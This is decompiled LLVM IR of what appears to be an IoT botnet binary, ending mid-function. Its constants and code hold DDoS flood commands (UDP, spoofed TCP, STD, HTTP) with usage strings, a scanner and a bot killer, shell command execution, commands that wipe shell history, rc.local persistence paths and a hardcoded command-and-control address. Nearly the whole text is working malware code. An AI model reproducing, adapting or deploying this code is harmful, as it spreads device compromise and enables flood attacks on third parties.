@global_var_1c068.569 = constant [4 x i8] c"syn\00"
@global_var_1c06c.571 = constant [4 x i8] c"rst\00"
@global_var_1c070.573 = constant [4 x i8] c"fin\00"
@global_var_1c074.575 = constant [4 x i8] c"ack\00"
@global_var_1c078.577 = constant [4 x i8] c"psh\00"
@global_var_1c07c.579 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1a8c8.585 = constant [5 x i8] c"mips\00"
@global_var_1a8d0.586 = constant [7 x i8] c"mipsel\00"
@global_var_1a8d8.587 = constant [4 x i8] c"sh4\00"
@global_var_1a8dc.588 = constant [4 x i8] c"x86\00"
@global_var_1a8e0.589 = constant [5 x i8] c"i686\00"
@global_var_1a8e8.590 = constant [4 x i8] c"ppc\00"
@global_var_1a8ec.591 = constant [5 x i8] c"i586\00"
@global_var_1a8f4.592 = constant [8 x i8] c"jackmy*\00"
@global_var_1a8fc.593 = constant [8 x i8] c"hackmy*\00"
@global_var_1a904.594 = constant [5 x i8] c"arm*\00"
@global_var_1a90c.595 = constant [3 x i8] c"b1\00"
@global_var_1a910.596 = constant [3 x i8] c"b2\00"
@global_var_1a914.597 = constant [3 x i8] c"b3\00"
@global_var_1a918.598 = constant [3 x i8] c"b4\00"
@global_var_1a91c.599 = constant [3 x i8] c"b5\00"
@global_var_1a920.600 = constant [3 x i8] c"b6\00"
@global_var_1a924.601 = constant [3 x i8] c"b7\00"
@global_var_1a928.602 = constant [3 x i8] c"b8\00"
@global_var_1a92c.603 = constant [3 x i8] c"b9\00"
@global_var_1a930.604 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1a944.605 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1a950.606 = constant [10 x i8] c"dvrHelper\00"
@global_var_1a95c.607 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1a964.608 = constant [5 x i8] c"FEUB\00"
@global_var_1a96c.609 = constant [9 x i8] c"FTUdftui\00"
@global_var_1a978.610 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1a984.611 = constant [6 x i8] c"jhUOH\00"
@global_var_1a98c.612 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1a998.613 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1a9a4.614 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1a9b0.615 = constant [10 x i8] c"lolmipsel\00"
@global_var_1a9bc.616 = constant [8 x i8] c"RYrydry\00"
@global_var_1a9c4.617 = constant [5 x i8] c"tel*\00"
@global_var_1a9cc.618 = constant [9 x i8] c"TwoFace*\00"
@global_var_1a9d8.619 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1a9e4.620 = constant [5 x i8] c"wget\00"
@global_var_1a9ec.621 = constant [7 x i8] c"x86_64\00"
@global_var_1a9f4.622 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1aa00.623 = constant [5 x i8] c"xxb*\00"
@global_var_1aa0c.624 = constant i32 49
@global_var_1aa10.625 = constant i32 50
@global_var_1aa14.626 = constant i32 51
@global_var_1aa18.627 = constant i32 52
@global_var_1aa1c.628 = constant i32 53
@global_var_1aa20.629 = constant i32 54
@global_var_1aa24.630 = constant i32 55
@global_var_1aa28.631 = constant i32 56
@global_var_1aa2c.632 = constant i32 57
@global_var_1aa30.633 = constant [3 x i8] c"10\00"
@global_var_1aa34.634 = constant [3 x i8] c"11\00"
@global_var_1aa38.635 = constant [3 x i8] c"12\00"
@global_var_1aa3c.636 = constant [3 x i8] c"13\00"
@global_var_1aa40.637 = constant [3 x i8] c"14\00"
@global_var_1aa44.638 = constant [3 x i8] c"15\00"
@global_var_1aa48.639 = constant [3 x i8] c"16\00"
@global_var_1aa4c.640 = constant [3 x i8] c"17\00"
@global_var_1aa50.641 = constant [3 x i8] c"18\00"
@global_var_1aa54.642 = constant [3 x i8] c"19\00"
@global_var_1aa58.643 = constant [3 x i8] c"20\00"
@global_var_1aa5c.644 = constant [6 x i8] c"hackz\00"
@global_var_1aa64.645 = constant [5 x i8] c"bin*\00"
@global_var_1aa6c.646 = constant [5 x i8] c"gtop\00"
@global_var_1aa74.647 = constant [5 x i8] c"ftp*\00"
@global_var_1aa7c.648 = constant [6 x i8] c"tftp*\00"
@global_var_1aa84.649 = constant [7 x i8] c"botnet\00"
@global_var_1aa8c.650 = constant [8 x i8] c"swatnet\00"
@global_var_1aa94.651 = constant [8 x i8] c"ballpit\00"
@global_var_1aa9c.652 = constant [8 x i8] c"fucknet\00"
@global_var_1aaa4.653 = constant [9 x i8] c"cracknet\00"
@global_var_1aab0.654 = constant [8 x i8] c"weednet\00"
@global_var_1aab8.655 = constant [7 x i8] c"gaynet\00"
@global_var_1aac0.656 = constant [9 x i8] c"queernet\00"
@global_var_1aacc.657 = constant [8 x i8] c"ballnet\00"
@global_var_1aad4.658 = constant [5 x i8] c"unet\00"
@global_var_1aadc.659 = constant [7 x i8] c"yougay\00"
@global_var_1aae4.660 = constant [7 x i8] c"sttftp\00"
@global_var_1aaec.661 = constant [7 x i8] c"sstftp\00"
@global_var_1aaf4.662 = constant [7 x i8] c"sbtftp\00"
@global_var_1aafc.663 = constant [6 x i8] c"btftp\00"
@global_var_1ab04.664 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1ab10.665 = constant [6 x i8] c"bruv*\00"
@global_var_1ab18.666 = constant [5 x i8] c"IoT*\00"
@global_var_1ab20.667 = constant [19 x i8] c"159.89.176.175:114\00"
@global_var_26024.668 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a8c8.585, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a8d0.586, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a8d8.587, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a8dc.588, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a8e0.589, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a8e8.590, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a8ec.591, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a8ec.591, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a8f4.592, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a8fc.593, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a904.594, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a90c.595, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a910.596, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a914.597, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a918.598, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a91c.599, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a920.600, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a924.601, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a928.602, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a92c.603, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1a930.604, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a944.605, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1a950.606, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a95c.607, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a964.608, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a96c.609, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a978.610, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a984.611, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a98c.612, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1a998.613, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1a9a4.614, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1a9b0.615, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a8c8.585, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a8d0.586, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a9bc.616, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9c4.617, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a9cc.618, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a9d8.619, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9e4.620, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a9ec.621, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a9f4.622, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aa00.623, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa08.41, i32 0, i32 0), i8* bitcast (i32* @global_var_1aa0c.624 to i8*), i8* bitcast (i32* @global_var_1aa10.625 to i8*), i8* bitcast (i32* @global_var_1aa14.626 to i8*), i8* bitcast (i32* @global_var_1aa18.627 to i8*), i8* bitcast (i32* @global_var_1aa1c.628 to i8*), i8* bitcast (i32* @global_var_1aa20.629 to i8*), i8* bitcast (i32* @global_var_1aa24.630 to i8*), i8* bitcast (i32* @global_var_1aa28.631 to i8*), i8* bitcast (i32* @global_var_1aa2c.632 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa30.633, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa34.634, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa38.635, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa3c.636, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa40.637, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa44.638, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa48.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa4c.640, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa50.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa54.642, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa58.643, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aa5c.644, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aa64.645, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aa6c.646, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aa74.647, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aa7c.648, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aa84.649, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aa8c.650, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aa94.651, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aa9c.652, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aaa4.653, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aab0.654, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aab8.655, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aac0.656, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aacc.657, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aad4.658, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aadc.659, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aae4.660, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aaec.661, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aaf4.662, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aafc.663, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ab04.664, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ab10.665, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ab18.666, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1ab20.667, i32 0, i32 0)]
@global_var_1c0a8.674 = constant i32 34
@global_var_1c0ac.676 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1c0c4.678 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1c0e4.680 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1c124.682 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1c164.683 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1c1a4.684 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1c234.685 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1c26c.686 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1c28c.687 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1c2a4.688 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1c0fc.697 = constant [6 x i8] c"close\00"
@global_var_1c104.698 = constant [11 x i8] c"keep-alive\00"
@global_var_1c110.699 = constant [7 x i8] c"accept\00"
@global_var_1c118.700 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c0fc.697, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c104.698, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c110.699, i32 0, i32 0)]
@global_var_1c318.704 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_1c358.708 = constant [6 x i8] c"PONG!\00"
@global_var_1c360.710 = constant [6 x i8] c"TABLE\00"
@global_var_1c368.712 = constant [3 x i8] c"%d\00"
@global_var_1c36c.714 = constant [8 x i8] c"SCANNER\00"
@global_var_1c374.716 = constant [4 x i8] c"OFF\00"
@global_var_2c850.718 = global i32 0
@global_var_1c378.720 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_1c38c.722 = constant [3 x i8] c"ON\00"
@global_var_1c390.725 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_1c3ac.727 = constant [8 x i8] c"REMOVER\00"
@global_var_1c3b4.729 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_1c3d4.731 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_1c3e0.733 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_1c3f4.735 = constant [4 x i8] c"UDP\00"
@global_var_1c3f8.737 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1c46c.740 = constant [4 x i8] c"TCP\00"
@global_var_1c470.742 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1c52c.744 = constant [5 x i8] c"HTTP\00"
@global_var_1c534.746 = constant [4 x i8] c"STD\00"
@global_var_1c538.748 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1c554.750 = constant [9 x i8] c"KILLATTK\00"
@global_var_1c560.754 = constant [11 x i8] c"Killed %d.\00"
@global_var_1c56c.756 = constant [13 x i8] c"None Killed.\00"
@global_var_1c57c.758 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_26180.761 = local_unnamed_addr global i32 -1
@global_var_2617c.763 = global [19 x i8]* @global_var_1ab20.667
@global_var_1c588.765 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1c590.768 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1c5a0.770 = constant [11 x i8] c"\0900000000\09\00"
@global_var_265dc.772 = global i32 0
@global_var_1c5ac.774 = constant [6 x i8] c"ROOTS\00"
@global_var_1c5b4.776 = constant i32 0
@global_var_1c5b8.778 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1c5d0.782 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1c5e0.784 = constant i32 47
@global_var_1c5e4.786 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1c5ec.788 = constant i32 97
@global_var_1c5f0.790 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1c600.794 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_1c60c.799 = constant [5 x i8] c"PONG\00"
@global_var_1c614.801 = constant [4 x i8] c"DUP\00"
@global_var_1c618.803 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1c62c.805 = constant [3 x i8] c"SH\00"
@global_var_1c630.807 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1c638.809 = constant [3 x i8] c"%s\00"
@global_var_1c63c.811 = constant i32 32
@global_var_2c810.813 = global i32 0
@global_var_26250 = external global i32
@global_var_26258 = external local_unnamed_addr global i32
@global_var_2c820.823 = global i32 0
@global_var_2628c.829 = global i32 0
@global_var_2a5ec.831 = global i32 0
@global_var_15a00.833 = constant i32 -481296384
@global_var_12efc.834 = constant i32 -442564544
@global_var_2a5f0.836 = global i32 0
@global_var_262a4.842 = global i32 2
@global_var_26274.848 = global i32 0
@global_var_132b4.849 = constant i32 -442564492
@global_var_26270.851 = global i32* bitcast (i8** @global_var_262a8.818 to i32*)
@global_var_1cc40.857 = constant i32 0
@global_var_13474.862 = constant i32 -382910448
@global_var_171e8.863 = constant i32 -382909968
@global_var_172a4.864 = constant i32 -382910224
@global_var_1cc74.866 = constant i32 135270416
@global_var_1cc58.868 = constant [6 x i8] c"(nil)\00"
@global_var_1cc60.871 = constant [7 x i8] c"(null)\00"
@global_var_1cc68.873 = constant i32 2949163
@global_var_1ccf4.876 = constant i32 16843008
@global_var_1ccdc.878 = constant i32 327688
@global_var_1ccd4.883 = constant [8 x i8] c" +0-#'I\00"
@global_var_1cc7c.885 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1ccbc.887 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1ccaf.889 = constant i32 117506048
@global_var_1ccb0.891 = constant i32 252117248
@global_var_1cca0.893 = constant i32 331776
@global_var_1cc90.895 = constant i32 335616
@global_var_149cc.927 = constant i32 -456978431
@global_var_1cd10.933 = constant [8 x i8] c"Success\00"
@global_var_1cd00.935 = constant [15 x i8] c"Unknown error \00"
@global_var_1d9ae.937 = constant i32 65536
@global_var_2658c.938 = global i32* @global_var_1d9ae.937
@global_var_2c5f4.941 = global i32 0
@global_var_2c5f8.944 = global i32 0
@global_var_2c7d4.946 = global i32 0
@global_var_2c608.948 = global i32 0
@global_var_26594.950 = global i32 0
@global_var_2c90c.955 = global i32 0
@global_var_2c900.958 = global i32 0
@global_var_2c858.960 = global i32 0
@global_var_2c7e8.962 = global i32 0
@global_var_26494.965 = global i32 256
@global_var_26398.966 = global i32* @global_var_26494.965
@global_var_2c8d8.970 = global i32 0
@global_var_1702c.971 = constant i32 -382910416
@global_var_15a80.978 = constant i32 -442564520
@global_var_264a0.984 = global i32 0
@global_var_12cc8.986 = constant i32 -481230848
@global_var_2c800.988 = global i32 0
@global_var_128b4.990 = constant i32 -509587456
@global_var_264b8.992 = global i32 0
@global_var_264d0 = external global i32
@global_var_264f0.998 = global i32 -1726662223
@global_var_264d8.1005 = local_unnamed_addr global i32* @global_var_264f0.998
@global_var_264d4.1007 = global i32* @global_var_264f0.998
@global_var_1d86c.1021 = constant i32 0
@global_var_1d894.1028 = constant [8 x i8] c"/bin/sh\00"
@global_var_1d89c.1030 = constant [3 x i8] c"sh\00"
@global_var_1d8a0.1032 = constant [3 x i8] c"-c\00"
@global_var_2656c.1036 = global i32 0
@global_var_2c804.1040 = local_unnamed_addr global i32 0
@global_var_133bc.1043 = constant i32 -382910416
@global_var_2c80c.1045 = global i32 0
@global_var_26000.1049 = global i32 -1
@global_var_2c814.1052 = global i32 0
@global_var_2c818.1054 = local_unnamed_addr global i32 0
@global_var_16af0.1055 = constant i32 -390234096
@global_var_1d8a4.1057 = constant [10 x i8] c"/dev/null\00"
@global_var_2c81c.1059 = global i32 0
@global_var_1333c.1063 = constant i32 -382909968
@global_var_2c808.1065 = local_unnamed_addr global i32 0
@global_var_14940.1068 = constant [3 x i8] c"J\0D\00"
@global_var_26584 = external local_unnamed_addr global i32
@global_var_12dc8.1079 = constant i32 -442564608
@global_var_16db8.1081 = constant i32 -335544720
@global_var_16ef0.1084 = constant i32 -275775369
@global_var_2c844.1086 = global i32 0
@global_var_2c824.1088 = global i32 0
@global_var_1dbb0.1090 = constant [4 x i8] c"inf\00"
@global_var_1dbb3.1094 = constant i32 1179535616
@global_var_1dbc0.1096 = constant i32 2883630
@global_var_145c8.1098 = constant i32 -382908944
@global_var_2c828.1106 = global i32 0
@global_var_2c840.1111 = local_unnamed_addr global i32 0
@global_var_12908.1116 = constant i32 -382910448
@global_var_2c910.1119 = global i32 0
@global_var_1dc0c.1121 = constant i32 46
@global_var_2c8f0.1123 = global i32 0
@global_var_18cf4.1125 = constant i32 -369098656
@global_var_1dc10.1132 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1dc24.1134 = constant i32 114
@global_var_1dc28.1136 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1dc40.1139 = constant [11 x i8] c"nameserver\00"
@global_var_1dc4c.1142 = constant [7 x i8] c"domain\00"
@global_var_1dc54.1144 = constant [7 x i8] c"search\00"
@global_var_2c914.1149 = global i32 0
@global_var_2c918.1151 = global i32 0
@global_var_1dc70.1160 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1dc5c.1162 = constant i32 0
@global_var_1dc84.1165 = constant [3 x i8] c"%x\00"
@global_var_1dc88.1168 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1dc94.1170 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_26004.1174 = global i32 0
@global_var_265b0.5 = external global i8*
@global_var_265e5.82 = local_unnamed_addr global i8 0
@global_var_265e6.83 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_262a8.818 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_262f8.819 = local_unnamed_addr global i8 16
@global_var_16b04.825 = constant i8 0
@global_var_262a9.854 = local_unnamed_addr global i8 1
@global_var_262f9.855 = local_unnamed_addr global i8 1
@3 = internal constant [2 x i8] c"\01\00"
@global_var_26590.1113 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_26591.1114 = local_unnamed_addr global i8 0
@global_var_1c5cc.780 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_265b0.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_265b0.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2601c.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2601c.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2601c.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2601c.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_265b0.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2601c.8, { 1, 0 }
  uselistorder i8** @global_var_265b0.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_26010.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_26010.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_26010.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_26010.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_117f4.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 108724, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
